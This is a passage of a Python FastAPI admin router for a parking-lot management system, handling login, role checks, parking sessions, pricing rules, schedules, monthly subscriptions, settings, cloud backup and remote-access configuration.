import csv
import io
import json
import re
from datetime import datetime, timedelta

from fastapi import APIRouter, Depends, HTTPException, Header, Response
from fastapi.responses import StreamingResponse
from openpyxl import Workbook
from sqlalchemy.orm import Session as DBSession

from app import crud, qr_utils, config, pricing_engine, cloud_sync
from app.database import get_db
from app.models import ParkingSession, PricingRule, Schedule, UserRole
from app.security import (
    issue_token, get_session, revoke_token, seconds_until_login_allowed,
    record_login_failure, record_login_success,
)
from app.schemas import (
    DashboardResponse, SpaceView, OccupiedInfo, MonthlyReservationInfo, PendingRegistration,
    AssignSpaceRequest, SessionDetail, PricingRuleIn, PricingRuleOut,
    ScheduleIn, ScheduleOut, LoginRequest, LoginResponse, SettingsUpdate,
    RevenueSummary, RevenueDashboard, RevenueSeriesPoint,
    UserIn, UserUpdateIn, UserOut, ResetPinRequest, ChangeOwnPinRequest,
    SubscriptionIn, SubscriptionUpdateIn, SubscriptionOut, LogPaymentRequest, TogglePartedRequest,
    CheckInRequest, AuditOut, MonthlyEventOut,
)

router = APIRouter(prefix="/api/admin", tags=["admin"])


def require_admin(authorization: str | None = Header(default=None)) -> dict:
    """Dependency guarding every admin route below (login/logout excepted):
    ANY logged-in user, regardless of role. Expects
    `Authorization: Bearer <token>` issued by /login. Combined with
    LocalOnlyMiddleware (network layer, see app/main.py), this means an
    admin route needs BOTH to be called from the same machine AND to carry
    a valid session token. Returns {"user_id": int, "role": str} so route
    handlers can act on who's calling when needed (e.g. change-own-pin)."""
    token = None
    if authorization and authorization.lower().startswith("bearer "):
        token = authorization.split(" ", 1)[1].strip()
    session = get_session(token)
    if not session:
        raise HTTPException(status_code=401, detail="Not authenticated. Please log in.")
    return session


def require_full_admin(session: dict = Depends(require_admin)) -> dict:
    """Everything require_admin does, PLUS: the logged-in user must have
    the ADMIN role. Applied to pricing, schedules, settings, cloud/remote/
    status-page config, revenue, history, exports, monthly-fee subscription
    management, and user management -- i.e. everything an ATTENDANT
    ("Vigilante") account must NOT be able to touch. This is checked here,
    server-side, on every one of those routes -- not just hidden in the UI,
    since a restricted account could otherwise call the API directly."""
    if session["role"] != UserRole.ADMIN.value:
        raise HTTPException(status_code=403, detail="This action requires an administrator account.")
    return session


# ---------------------------------------------------------------------------
# Auth
# ---------------------------------------------------------------------------
@router.post("/login", response_model=LoginResponse)
def login(payload: LoginRequest, db: DBSession = Depends(get_db)):
    wait = seconds_until_login_allowed(payload.username)
    if wait:
        raise HTTPException(
            status_code=429,
            detail=f"Too many failed login attempts. Try again in {wait} seconds.",
            headers={"Retry-After": str(wait)},
        )
    user = crud.verify_login(db, payload.username, payload.pin)
    if not user:
        record_login_failure(payload.username)
        # The attempted username is recorded (never the PIN) so repeated
        # guessing against an account shows up in the audit trail.
        crud.log_audit(db, {"username": "-", "role": None}, "LOGIN_FAILED", payload.username[:40])
        raise HTTPException(status_code=401, detail="Incorrect username or PIN.")
    record_login_success(payload.username)
    crud.log_audit(db, {"username": user.username, "role": user.role}, "LOGIN_OK", user.username)
    token = issue_token(user.id, user.role, user.username)
    return LoginResponse(token=token, role=user.role, display_name=user.display_name, username=user.username)


@router.post("/logout")
def logout(authorization: str | None = Header(default=None)):
    if authorization and authorization.lower().startswith("bearer "):
        revoke_token(authorization.split(" ", 1)[1].strip())
    return {"ok": True}


@router.get("/me", dependencies=[Depends(require_admin)])
def me(session: dict = Depends(require_admin), db: DBSession = Depends(get_db)):
    user = crud.get_user(db, session["user_id"])
    if not user:
        raise HTTPException(status_code=404, detail="User not found.")
    return {"id": user.id, "username": user.username, "display_name": user.display_name, "role": user.role}


@router.put("/me/pin")
def change_own_pin(payload: ChangeOwnPinRequest, session: dict = Depends(require_admin), db: DBSession = Depends(get_db)):
    try:
        crud.change_own_pin(db, session["user_id"], payload.current_pin, payload.new_pin)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    crud.log_audit(db, session, "PIN_CHANGED", session.get("username"))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Users (admin-only: creating/editing accounts and resetting OTHER users'
# PINs. Any user can change their OWN pin via PUT /me/pin above.)
# ---------------------------------------------------------------------------
@router.get("/users", response_model=list[UserOut], dependencies=[Depends(require_full_admin)])
def list_users(db: DBSession = Depends(get_db)):
    return [UserOut(id=u.id, username=u.username, display_name=u.display_name, role=u.role, active=u.active)
            for u in crud.list_users(db)]


@router.post("/users", response_model=UserOut, dependencies=[Depends(require_full_admin)])
def create_user(payload: UserIn, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    try:
        user = crud.create_user(db, payload.username, payload.display_name, payload.pin, payload.role)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    crud.log_audit(db, actor, "USER_CREATED", user.username, f"role={user.role}")
    return UserOut(id=user.id, username=user.username, display_name=user.display_name,
                   role=user.role, active=user.active)


@router.put("/users/{user_id}", response_model=UserOut, dependencies=[Depends(require_full_admin)])
def update_user(user_id: int, payload: UserUpdateIn, actor: dict = Depends(require_full_admin),
                db: DBSession = Depends(get_db)):
    try:
        user = crud.update_user(db, user_id, display_name=payload.display_name, role=payload.role, active=payload.active)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    changes = payload.model_dump(exclude_none=True)
    crud.log_audit(db, actor, "USER_UPDATED", user.username,
                   ", ".join(f"{k}={v}" for k, v in changes.items()))
    return UserOut(id=user.id, username=user.username, display_name=user.display_name,
                   role=user.role, active=user.active)


@router.put("/users/{user_id}/reset-pin", dependencies=[Depends(require_full_admin)])
def reset_user_pin(user_id: int, payload: ResetPinRequest, actor: dict = Depends(require_full_admin),
                   db: DBSession = Depends(get_db)):
    try:
        crud.reset_user_pin(db, user_id, payload.new_pin)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    target = crud.get_user(db, user_id)
    crud.log_audit(db, actor, "USER_PIN_RESET", target.username if target else str(user_id))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Dashboard
# ---------------------------------------------------------------------------
def _monthly_lookup(db: DBSession) -> dict:
    """space_id -> MonthlySubscription, for active subscriptions only."""
    return {s.space_id: s for s in crud.list_subscriptions(db, status="ACTIVE")}


@router.get("/dashboard", response_model=DashboardResponse, dependencies=[Depends(require_admin)])
def dashboard(db: DBSession = Depends(get_db)):
    monthly_by_space = _monthly_lookup(db)
    occupied_by_space = {s.space_id: s for s in crud.occupied_sessions(db)}
    spaces_out = []
    for space in crud.list_spaces(db):
        occupied = None
        if space.status == "OCCUPIED":
            session = occupied_by_space.get(space.id)
            if session:
                elapsed, amount = crud.live_estimate(db, session)
                occupied = OccupiedInfo(
                    session_id=session.id,
                    customer_name=session.customer.name,
                    plate=session.customer.plate,
                    phone=session.customer.phone,
                    entry_timestamp=session.entry_timestamp,
                    elapsed_minutes=round(elapsed, 1),
                    current_amount=amount,
                    pricing_rule_name=session.pricing_rule_name or "",
                    person_type=session.person_type, unit=session.unit,
                    visiting=session.visiting, vehicle=session.vehicle_desc,
                )
        monthly = None
        sub = monthly_by_space.get(space.id)
        if sub:
            monthly = MonthlyReservationInfo(
                subscription_id=sub.id, customer_name=sub.customer_name, plate=sub.plate,
                currently_parked=sub.currently_parked, is_overdue=crud.is_subscription_overdue(sub),
            )
        spaces_out.append(SpaceView(id=space.id, number=space.number, status=space.status,
                                     occupied=occupied, monthly=monthly))

    pending_out = []
    for session in crud.pending_registrations(db):
        waiting = (datetime.now() - session.entry_timestamp).total_seconds() / 60.0
        pending_out.append(PendingRegistration(
            session_id=session.id,
            customer_name=session.customer.name,
            plate=session.customer.plate,
            phone=session.customer.phone,
            entry_timestamp=session.entry_timestamp,
            waiting_minutes=round(waiting, 1),
            person_type=session.person_type, unit=session.unit,
            visiting=session.visiting, vehicle=session.vehicle_desc,
        ))

    available = sum(1 for s in spaces_out if s.status == "AVAILABLE" and s.monthly is None)
    occupied = sum(1 for s in spaces_out if s.status == "OCCUPIED")
    monthly_reserved = sum(1 for s in spaces_out if s.monthly is not None)
    return DashboardResponse(
        spaces=spaces_out,
        available_count=available,
        occupied_count=occupied,
        monthly_count=monthly_reserved,
        pending=pending_out,
        server_time=datetime.now(),
        currency=crud.get_currency(db),
    )


@router.post("/sessions/check-in", response_model=SessionDetail)
def check_in(payload: CheckInRequest, actor: dict = Depends(require_admin), db: DBSession = Depends(get_db)):
    """The attendant registers a vehicle at the gate (a resident's car, a
    visitor who did not scan the QR, a delivery). Available to every
    logged-in role; the entry time is stamped by this server and the
    attendant's username is recorded on the session and in the audit trail."""
    try:
        session = crud.create_session(
            db, payload.name, payload.plate, payload.phone,
            person_type=payload.person_type, unit=payload.unit, visiting=payload.visiting,
            vehicle_desc=payload.vehicle, source="MANUAL", actor=actor, space_id=payload.space_id,
        )
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    return _to_session_detail(db, session)


@router.post("/sessions/{session_id}/assign-space", response_model=SessionDetail)
def assign_space(session_id: int, payload: AssignSpaceRequest, actor: dict = Depends(require_admin),
                 db: DBSession = Depends(get_db)):
    try:
        session = crud.assign_space(db, session_id, payload.space_id, actor=actor)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    return _to_session_detail(db, session)


@router.post("/sessions/{session_id}/exit", response_model=SessionDetail)
def register_exit(session_id: int, actor: dict = Depends(require_admin), db: DBSession = Depends(get_db)):
    try:
        session = crud.register_exit(db, session_id, actor=actor)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    return _to_session_detail(db, session)


@router.post("/sessions/{session_id}/cancel", response_model=SessionDetail)
def cancel_session(session_id: int, actor: dict = Depends(require_admin), db: DBSession = Depends(get_db)):
    try:
        session = crud.cancel_session(db, session_id, actor=actor)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    return _to_session_detail(db, session)


@router.get("/sessions/{session_id}", response_model=SessionDetail, dependencies=[Depends(require_admin)])
def session_detail(session_id: int, db: DBSession = Depends(get_db)):
    session = crud.get_session(db, session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found.")
    return _to_session_detail(db, session)


def _to_session_detail(db: DBSession, session) -> SessionDetail:
    estimated = None
    if session.status == "OCCUPIED":
        _, estimated = crud.live_estimate(db, session)
    return SessionDetail(
        id=session.id,
        customer_name=session.customer.name,
        plate=session.customer.plate,
        phone=session.customer.phone,
        space_number=session.space.number if session.space else None,
        entry_timestamp=session.entry_timestamp,
        exit_timestamp=session.exit_timestamp,
        duration_minutes=session.duration_minutes,
        pricing_rule_name=session.pricing_rule_name,
        status=session.status,
        final_amount=session.final_amount,
        estimated_amount=estimated,
        currency=crud.get_currency(db),
        person_type=session.person_type,
        unit=session.unit,
        visiting=session.visiting,
        vehicle=session.vehicle_desc,
        source=session.source,
        checked_in_by=session.checked_in_by,
        checked_out_by=session.checked_out_by,
    )


# ---------------------------------------------------------------------------
# History (admin-only -- see require_full_admin docstring)
# ---------------------------------------------------------------------------
DATE_PRESETS = {"today", "yesterday", "this_week", "this_month"}


def _parse_bound(value: str | None, is_end: bool) -> datetime | None:
    """Parses a user-supplied ISO date/datetime. A bare date ("2026-10-09")
    used as the END of a range means the whole day, so it becomes the next
    midnight (the filters treat the upper bound as exclusive)."""
    if not value:
        return None
    try:
        parsed = datetime.fromisoformat(value)
    except ValueError:
        raise HTTPException(status_code=400, detail=f"Invalid date: '{value}'. Use YYYY-MM-DD.")
    if is_end and len(value.strip()) == 10:
        parsed = parsed + timedelta(days=1)
    return parsed


def _resolve_date_range(preset: str | None, date_from: str | None, date_to: str | None):
    now = datetime.now()
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    if preset == "today":
        return today_start, today_start + timedelta(days=1)
    if preset == "yesterday":
        return today_start - timedelta(days=1), today_start
    if preset == "this_week":
        start = today_start - timedelta(days=today_start.weekday())
        return start, start + timedelta(days=7)
    if preset == "this_month":
        start = today_start.replace(day=1)
        return start, now + timedelta(days=1)
    return _parse_bound(date_from, False), _parse_bound(date_to, True)


def history_filters(
    plate: str | None = None,
    customer: str | None = None,
    space: str | None = None,
    status: str | None = None,
    date_preset: str | None = None,
    date_from: str | None = None,
    date_to: str | None = None,
    person_type: str | None = None,
    unit: str | None = None,
) -> dict:
    """Query parameters shared by the History table and the CSV/Excel
    exports, so an export downloads exactly what the filters on screen show."""
    d_from, d_to = _resolve_date_range(date_preset, date_from, date_to)
    return dict(plate=plate, customer=customer, space_number=space, status=status,
                date_from=d_from, date_to=d_to,
                person_type=(person_type or None), unit=(unit or None))


@router.get("/history", dependencies=[Depends(require_full_admin)])
def history(
    filters: dict = Depends(history_filters),
    limit: int = 100,
    offset: int = 0,
    db: DBSession = Depends(get_db),
):
    limit = max(1, min(limit, 1000))
    offset = max(0, offset)
    rows, total = crud.search_history(db, limit=limit, offset=offset, **filters)
    return {
        "total": total,
        "limit": limit,
        "offset": offset,
        "results": [_to_session_detail(db, s).model_dump() for s in rows],
    }


# ---------------------------------------------------------------------------
# Revenue (admin-only)
# ---------------------------------------------------------------------------
def _summary(db: DBSession, label: str, start: datetime, end: datetime) -> RevenueSummary:
    data = crud.revenue_between(db, start, end)
    return RevenueSummary(range_label=label, start=start, end=end, currency=crud.get_currency(db), **data)


@router.get("/revenue", response_model=RevenueDashboard, dependencies=[Depends(require_full_admin)])
def revenue(db: DBSession = Depends(get_db)):
    now = datetime.now()
    today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
    week_start = today_start - timedelta(days=today_start.weekday())
    month_start = today_start.replace(day=1)

    series = [RevenueSeriesPoint(**p) for p in crud.daily_revenue_series(db, days=14)]
    return RevenueDashboard(
        today=_summary(db, "Today", today_start, today_start + timedelta(days=1)),
        this_week=_summary(db, "This week", week_start, week_start + timedelta(days=7)),
        this_month=_summary(db, "This month", month_start, now + timedelta(days=1)),
        daily_series=series,
        monthly_fees_today=crud.monthly_revenue_between(db, today_start, today_start + timedelta(days=1)),
        monthly_fees_this_week=crud.monthly_revenue_between(db, week_start, week_start + timedelta(days=7)),
        monthly_fees_this_month=crud.monthly_revenue_between(db, month_start, now + timedelta(days=1)),
    )


# ---------------------------------------------------------------------------
# Pricing rules (admin-only)
# ---------------------------------------------------------------------------
@router.get("/pricing-rules", response_model=list[PricingRuleOut], dependencies=[Depends(require_full_admin)])
def list_pricing_rules(db: DBSession = Depends(get_db)):
    rules = db.query(PricingRule).order_by(PricingRule.id.asc()).all()
    return [PricingRuleOut(id=r.id, name=r.name, type=r.type, configuration=json.loads(r.configuration),
                            is_default=r.is_default, active=r.active) for r in rules]


@router.post("/pricing-rules", response_model=PricingRuleOut, dependencies=[Depends(require_full_admin)])
def create_pricing_rule(payload: PricingRuleIn, actor: dict = Depends(require_full_admin),
                        db: DBSession = Depends(get_db)):
    error = pricing_engine.validate_configuration(payload.type, payload.configuration)
    if error:
        raise HTTPException(status_code=400, detail=error)
    if payload.is_default:
        db.query(PricingRule).update({PricingRule.is_default: False})
    rule = PricingRule(
        name=payload.name, type=payload.type, configuration=json.dumps(payload.configuration),
        is_default=payload.is_default, active=payload.active,
    )
    db.add(rule)
    crud.add_audit(db, actor, "PRICING_CREATED", rule.name, f"type={rule.type}")
    db.commit()
    db.refresh(rule)
    return PricingRuleOut(id=rule.id, name=rule.name, type=rule.type,
                           configuration=json.loads(rule.configuration),
                           is_default=rule.is_default, active=rule.active)


@router.put("/pricing-rules/{rule_id}", response_model=PricingRuleOut, dependencies=[Depends(require_full_admin)])
def update_pricing_rule(rule_id: int, payload: PricingRuleIn, actor: dict = Depends(require_full_admin),
                        db: DBSession = Depends(get_db)):
    rule = db.query(PricingRule).filter(PricingRule.id == rule_id).first()
    if not rule:
        raise HTTPException(status_code=404, detail="Pricing rule not found.")
    error = pricing_engine.validate_configuration(payload.type, payload.configuration)
    if error:
        raise HTTPException(status_code=400, detail=error)
    if payload.is_default:
        db.query(PricingRule).update({PricingRule.is_default: False})
    rule.name = payload.name
    rule.type = payload.type
    rule.configuration = json.dumps(payload.configuration)
    rule.is_default = payload.is_default
    rule.active = payload.active
    rule.updated_at = datetime.now()
    crud.add_audit(db, actor, "PRICING_UPDATED", rule.name, f"type={rule.type}; configuration={json.dumps(payload.configuration)[:300]}")
    db.commit()
    db.refresh(rule)
    return PricingRuleOut(id=rule.id, name=rule.name, type=rule.type,
                           configuration=json.loads(rule.configuration),
                           is_default=rule.is_default, active=rule.active)


@router.delete("/pricing-rules/{rule_id}", dependencies=[Depends(require_full_admin)])
def delete_pricing_rule(rule_id: int, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    rule = db.query(PricingRule).filter(PricingRule.id == rule_id).first()
    if not rule:
        raise HTTPException(status_code=404, detail="Pricing rule not found.")
    in_use = db.query(Schedule).filter(Schedule.pricing_rule_id == rule_id).first()
    if in_use:
        raise HTTPException(
            status_code=400,
            detail=f"Rule is used by schedule '{in_use.name}'. Remove or reassign that schedule first.",
        )
    # Sessions keep a foreign key to the rule they were priced with, so a rule
    # that has ever been used can't be deleted without orphaning history (the
    # database refuses it, which used to surface as a bare HTTP 500).
    # Deactivating keeps the history intact and stops the rule from being
    # offered to new sessions.
    used_by_sessions = db.query(ParkingSession.id).filter(ParkingSession.pricing_rule_id == rule_id).first()
    if used_by_sessions:
        raise HTTPException(
            status_code=400,
            detail="Rule has already been used by parking sessions and can't be deleted. "
                   "Deactivate it instead (uncheck 'Active') to keep the history intact.",
        )
    others = db.query(PricingRule).filter(PricingRule.id != rule_id, PricingRule.active.is_(True)).count()
    if rule.active and others == 0:
        raise HTTPException(status_code=400, detail="At least one active pricing rule must remain.")
    crud.add_audit(db, actor, "PRICING_DELETED", rule.name)
    db.delete(rule)
    db.commit()
    return {"ok": True}


# ---------------------------------------------------------------------------
# Schedules (admin-only)
# ---------------------------------------------------------------------------
@router.get("/schedules", response_model=list[ScheduleOut], dependencies=[Depends(require_full_admin)])
def list_schedules(db: DBSession = Depends(get_db)):
    schedules = db.query(Schedule).order_by(Schedule.priority.asc()).all()
    return [
        ScheduleOut(id=s.id, name=s.name, days_of_week=s.days_of_week, start_time=s.start_time,
                    end_time=s.end_time, pricing_rule_id=s.pricing_rule_id,
                    pricing_rule_name=s.pricing_rule.name if s.pricing_rule else "?",
                    priority=s.priority, active=s.active)
        for s in schedules
    ]


@router.post("/schedules", response_model=ScheduleOut, dependencies=[Depends(require_full_admin)])
def create_schedule(payload: ScheduleIn, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    rule = db.query(PricingRule).filter(PricingRule.id == payload.pricing_rule_id).first()
    if not rule:
        raise HTTPException(status_code=400, detail="Pricing rule not found.")
    schedule = Schedule(**payload.model_dump())
    db.add(schedule)
    crud.add_audit(db, actor, "SCHEDULE_CREATED", payload.name, f"days={payload.days_of_week}; time={payload.start_time}-{payload.end_time}; rule={rule.name}")
    db.commit()
    db.refresh(schedule)
    return ScheduleOut(id=schedule.id, name=schedule.name, days_of_week=schedule.days_of_week,
                        start_time=schedule.start_time, end_time=schedule.end_time,
                        pricing_rule_id=schedule.pricing_rule_id, pricing_rule_name=rule.name,
                        priority=schedule.priority, active=schedule.active)


@router.put("/schedules/{schedule_id}", response_model=ScheduleOut, dependencies=[Depends(require_full_admin)])
def update_schedule(schedule_id: int, payload: ScheduleIn, actor: dict = Depends(require_full_admin),
                    db: DBSession = Depends(get_db)):
    schedule = db.query(Schedule).filter(Schedule.id == schedule_id).first()
    if not schedule:
        raise HTTPException(status_code=404, detail="Schedule not found.")
    rule = db.query(PricingRule).filter(PricingRule.id == payload.pricing_rule_id).first()
    if not rule:
        raise HTTPException(status_code=400, detail="Pricing rule not found.")
    for field, value in payload.model_dump().items():
        setattr(schedule, field, value)
    crud.add_audit(db, actor, "SCHEDULE_UPDATED", payload.name, f"days={payload.days_of_week}; time={payload.start_time}-{payload.end_time}; rule={rule.name}; active={payload.active}")
    db.commit()
    db.refresh(schedule)
    return ScheduleOut(id=schedule.id, name=schedule.name, days_of_week=schedule.days_of_week,
                        start_time=schedule.start_time, end_time=schedule.end_time,
                        pricing_rule_id=schedule.pricing_rule_id, pricing_rule_name=rule.name,
                        priority=schedule.priority, active=schedule.active)


@router.delete("/schedules/{schedule_id}", dependencies=[Depends(require_full_admin)])
def delete_schedule(schedule_id: int, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    schedule = db.query(Schedule).filter(Schedule.id == schedule_id).first()
    if not schedule:
        raise HTTPException(status_code=404, detail="Schedule not found.")
    crud.add_audit(db, actor, "SCHEDULE_DELETED", schedule.name)
    db.delete(schedule)
    db.commit()
    return {"ok": True}


# ---------------------------------------------------------------------------
# Monthly subscriptions ("mensualidades") -- LIST/log-payment/toggle-parked
# are available to any logged-in user (an attendant collects cash and marks
# cars parked/gone); create/edit/cancel/fee changes are admin-only, same
# bucket as pricing.
# ---------------------------------------------------------------------------
def _to_subscription_out(db: DBSession, sub) -> SubscriptionOut:
    return SubscriptionOut(
        id=sub.id, customer_name=sub.customer_name, plate=sub.plate,
        additional_plates=sub.additional_plates, phone=sub.phone,
        space_id=sub.space_id, space_number=sub.space.number if sub.space else "?",
        monthly_fee=sub.monthly_fee, status=sub.status, start_date=sub.start_date,
        next_due_date=sub.next_due_date, currently_parked=sub.currently_parked,
        is_overdue=crud.is_subscription_overdue(sub), notes=sub.notes,
        currency=crud.get_currency(db),
    )


@router.get("/subscriptions", response_model=list[SubscriptionOut], dependencies=[Depends(require_admin)])
def list_subscriptions(status: str | None = None, db: DBSession = Depends(get_db)):
    return [_to_subscription_out(db, s) for s in crud.list_subscriptions(db, status=status)]


@router.post("/subscriptions", response_model=SubscriptionOut, dependencies=[Depends(require_full_admin)])
def create_subscription(payload: SubscriptionIn, actor: dict = Depends(require_full_admin),
                        db: DBSession = Depends(get_db)):
    try:
        sub = crud.create_subscription(
            db, payload.customer_name, payload.plate, payload.space_id, payload.monthly_fee,
            phone=payload.phone, additional_plates=payload.additional_plates, notes=payload.notes,
        )
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    crud.log_audit(db, actor, "SUBSCRIPTION_CREATED", sub.plate,
                   f"name={sub.customer_name}; space={sub.space.number if sub.space else '?'}; fee={sub.monthly_fee}")
    return _to_subscription_out(db, sub)


@router.put("/subscriptions/{subscription_id}", response_model=SubscriptionOut, dependencies=[Depends(require_full_admin)])
def update_subscription(subscription_id: int, payload: SubscriptionUpdateIn, actor: dict = Depends(require_full_admin),
                        db: DBSession = Depends(get_db)):
    try:
        sub = crud.update_subscription(
            db, subscription_id, customer_name=payload.customer_name, plate=payload.plate,
            phone=payload.phone, additional_plates=payload.additional_plates,
            monthly_fee=payload.monthly_fee, notes=payload.notes,
        )
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    crud.log_audit(db, actor, "SUBSCRIPTION_UPDATED", sub.plate,
                   ", ".join(k for k in payload.model_dump(exclude_none=True)))
    return _to_subscription_out(db, sub)


@router.post("/subscriptions/{subscription_id}/cancel", response_model=SubscriptionOut, dependencies=[Depends(require_full_admin)])
def cancel_subscription(subscription_id: int, actor: dict = Depends(require_full_admin),
                        db: DBSession = Depends(get_db)):
    try:
        sub = crud.cancel_subscription(db, subscription_id)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    crud.log_audit(db, actor, "SUBSCRIPTION_CANCELLED", sub.plate, f"name={sub.customer_name}")
    return _to_subscription_out(db, sub)


@router.post("/subscriptions/{subscription_id}/log-payment", response_model=SubscriptionOut)
def log_payment(subscription_id: int, payload: LogPaymentRequest, actor: dict = Depends(require_admin),
                db: DBSession = Depends(get_db)):
    try:
        crud.log_monthly_payment(db, subscription_id, payload.amount_paid, notes=payload.notes)
        sub = crud.get_subscription(db, subscription_id)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    crud.log_audit(db, actor, "PAYMENT_LOGGED", sub.plate, f"name={sub.customer_name}; amount={payload.amount_paid}")
    return _to_subscription_out(db, sub)


@router.post("/subscriptions/{subscription_id}/toggle-parked", response_model=SubscriptionOut)
def toggle_parked(subscription_id: int, payload: TogglePartedRequest, actor: dict = Depends(require_admin),
                  db: DBSession = Depends(get_db)):
    """Registers the subscriber's vehicle coming IN or going OUT. Every real
    change is stored with its time and the attendant's username
    (MonthlyAccessEvent)."""
    try:
        sub = crud.toggle_currently_parked(db, subscription_id, payload.parked, actor=actor)
    except crud.BusinessError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    return _to_subscription_out(db, sub)


@router.get("/subscriptions/{subscription_id}/events", response_model=list[MonthlyEventOut],
            dependencies=[Depends(require_admin)])
def subscription_events(subscription_id: int, db: DBSession = Depends(get_db)):
    rows, _ = crud.search_monthly_events(db, subscription_id=subscription_id, limit=50)
    return [_monthly_event_out(e) for e in rows]


# ---------------------------------------------------------------------------
# Settings (admin-only)
# ---------------------------------------------------------------------------
@router.get("/settings", dependencies=[Depends(require_full_admin)])
def get_settings(db: DBSession = Depends(get_db)):
    return {
        "business_name": crud.get_setting(db, "business_name"),
        "currency_code": crud.get_setting(db, "currency_code"),
        "currency_symbol": crud.get_setting(db, "currency_symbol"),
        "num_spaces": config.NUM_PARKING_SPACES,
        "data_dir": str(config.DATA_DIR),
    }


@router.put("/settings", dependencies=[Depends(require_full_admin)])
def update_settings(payload: SettingsUpdate, actor: dict = Depends(require_full_admin),
                    db: DBSession = Depends(get_db)):
    changes = payload.model_dump(exclude_none=True)
    for key, value in changes.items():
        crud.set_setting(db, key, str(value))
    crud.log_audit(db, actor, "SETTINGS_UPDATED", None, ", ".join(f"{k}={v}" for k, v in changes.items()))
    return {"ok": True}


# ---------------------------------------------------------------------------
# Cloud backup (admin-only -- optional, see app/cloud_sync.py and CLOUD_BACKUP.md)
# ---------------------------------------------------------------------------
@router.get("/cloud-sync/status", dependencies=[Depends(require_full_admin)])
def cloud_sync_status(db: DBSession = Depends(get_db)):
    cfg = cloud_sync.get_config(db)
    return {
        "enabled": cfg["enabled"],
        "url_configured": bool(cfg["url"]),
        "last_success": cfg["last_success"],
        "last_error": cfg["last_error"],
        "pending_count": cloud_sync.pending_count(db),
    }


def _as_bool(value) -> bool | None:
    if value is None or isinstance(value, bool):
        return value
    return str(value).strip().lower() in ("1", "true", "yes", "on")


@router.put("/cloud-sync", dependencies=[Depends(require_full_admin)])
def cloud_sync_update(payload: dict, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    url = payload.get("url")
    if url is not None:
        url = str(url).strip()
        # Only web endpoints: urllib would also happily open file:// or ftp://.
        if url and not (url.startswith("https://") or url.startswith("http://")):
            raise HTTPException(status_code=400, detail="URL must start with https:// or http://")
    cloud_sync.set_config(
        db,
        enabled=_as_bool(payload.get("enabled")),
        url=url,
        secret=payload.get("secret"),
    )
    # The secret itself is never written to the audit trail.
    crud.log_audit(db, actor, "CLOUD_SYNC_UPDATED", None,
                   f"enabled={payload.get('enabled')}; url={'set' if url else 'unchanged/empty'}; "
                   f"secret={'changed' if payload.get('secret') else 'unchanged'}")
    return {"ok": True}


@router.get("/cloud-sync/config", dependencies=[Depends(require_full_admin)])
def cloud_sync_get_config(db: DBSession = Depends(get_db)):
    cfg = cloud_sync.get_config(db)
    return {"enabled": cfg["enabled"], "url": cfg["url"], "secret": cfg["secret"]}


@router.post("/cloud-sync/sync-now", dependencies=[Depends(require_full_admin)])
def cloud_sync_now(db: DBSession = Depends(get_db)):
    result = cloud_sync.sync_pending_sessions(db, limit=100)
    return result


@router.post("/cloud-sync/test", dependencies=[Depends(require_full_admin)])
def cloud_sync_test(db: DBSession = Depends(get_db)):
    """Checks the saved URL and secret without sending any real record."""
    ok, message = cloud_sync.check_connection(db)
    return {"ok": ok, "message": message}


# ---------------------------------------------------------------------------
# QR (any logged-in user can view/refresh it -- an attendant may need to
# reprint or re-show it)
# ---------------------------------------------------------------------------
@router.get("/qr", dependencies=[Depends(require_admin)])
def get_qr(db: DBSession = Depends(get_db)):
    url = qr_utils.registration_url(db)
    png = qr_utils.generate_qr_png(url)
    return Response(content=png, media_type="image/png", headers={"X-Registration-URL": url})


@router.get("/qr-info", dependencies=[Depends(require_admin)])
def qr_info(db: DBSession = Depends(get_db)):
    return {
        "registration_url": qr_utils.registration_url(db),
        "local_url": qr_utils.local_registration_url(),
        "using_public_url": crud.get_setting(db, "public_access_enabled", "false") == "true"
        and bool((crud.get_setting(db, "public_base_url", "") or "").strip()),
    }


# ---------------------------------------------------------------------------
# Remote access (admin-only -- optional, see REMOTE_ACCESS.md)
# ---------------------------------------------------------------------------
@router.get("/remote-access", dependencies=[Depends(require_full_admin)])
def get_remote_access(db: DBSession = Depends(get_db)):
    return {
        "enabled": crud.get_setting(db, "public_access_enabled", "false") == "true",
        "public_base_url": crud.get_setting(db, "public_base_url", "") or "",
    }


@router.put("/remote-access", dependencies=[Depends(require_full_admin)])
def update_remote_access(payload: dict, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    if "enabled" in payload:
        crud.set_setting(db, "public_access_enabled", "true" if payload["enabled"] else "false")
    if "public_base_url" in payload:
        url = (payload["public_base_url"] or "").strip().rstrip("/")
        if url and not (url.startswith("https://") or url.startswith("http://")):
            raise HTTPException(status_code=400, detail="URL must start with https:// or http://")
        crud.set_setting(db, "public_base_url", url)
    crud.log_audit(db, actor, "REMOTE_ACCESS_UPDATED", None, f"enabled={payload.get('enabled')}")
    return {"ok": True}


# ---------------------------------------------------------------------------
# Status page (admin-only -- optional, GitHub Pages + Google Sheets, see
# GITHUB_PAGES_STATUS.md). Distinct from Remote Access above: this is a
# read-only "check my status from anywhere" companion link that piggybacks
# on the Cloud Backup Sheet, rather than a full reverse proxy to this app.
